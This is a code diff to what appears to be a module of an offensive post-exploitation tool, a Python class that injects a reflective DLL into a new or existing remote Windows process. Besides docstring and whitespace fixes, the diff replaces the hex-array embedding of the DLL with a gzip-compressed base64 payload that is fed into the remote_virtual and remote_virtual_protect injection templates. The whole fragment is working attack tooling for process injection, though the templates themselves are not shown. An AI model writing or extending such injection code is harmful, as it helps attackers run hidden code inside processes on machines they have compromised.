@@ -1,5 +1,6 @@
 from modules.inject_shellcode import Inject_shellcode, ModuleException
 from core import config
+from utils import gzip_utils
 import pefile
 
 
@@ -16,7 +17,7 @@ class Inject_dll_reflective(Inject_shellcode):
               
               
         Inject a reflective DLL into a remote process.
-        You can choose if create a new process or use a pid of an existing process as a host process.
+        You can choose to create a new process or use a pid of an existing process as a host process.
         The dll_path is a relative path to a dll that exists in the folder 'reflective_dll/'.
         The dll must be compiled with the reflective loader exported function otherwise it cannot be executed
         at runtime.
@@ -45,8 +46,7 @@ class Inject_dll_reflective(Inject_shellcode):
         Examples:
             Inject a messagebox reflective DLL into an existing process:
                 #inject_dll_reflective messagebox_reflective_x64.dll 'remote_virtual' '2264'
-           
-                                                
+                                             
     """
 
     def __get_reflective_loader_offset(self, dll_path):
@@ -64,11 +64,13 @@ class Inject_dll_reflective(Inject_shellcode):
         code_offset = str(self.__get_reflective_loader_offset(dll_path))
         with open(dll_path, 'rb') as file_handle:
             byte_arr = bytearray(file_handle.read())
-        byte_arr_code = '{' + ",".join('0x{:02x}'.format(x) for x in byte_arr) + '}'
-        byte_arr_code_csharp = self._template_shellcode_csharp % byte_arr_code
+        base64_compressed_dll = gzip_utils.get_compressed_base64_from_binary(byte_arr)
         if injection_type == 'remote_virtual_protect':
-            return self._runtime_code_virtual_protect % (byte_arr_code_csharp, thread_parameters, remote_process,
-                                                         thread_timeout, code_offset)
+            runtime_code = self._runtime_code % (self._runtime_code_virtual_protect, base64_compressed_dll,
+                                                 thread_parameters, remote_process,
+                                                 thread_timeout, code_offset)
         else:
-            return self._runtime_code % (byte_arr_code_csharp, thread_parameters, remote_process,
-                                         thread_timeout, code_offset)
+            runtime_code = self._runtime_code % (self._runtime_code_virtual, base64_compressed_dll,
+                                                 thread_parameters, remote_process,
+                                                 thread_timeout, code_offset)
+        return runtime_code
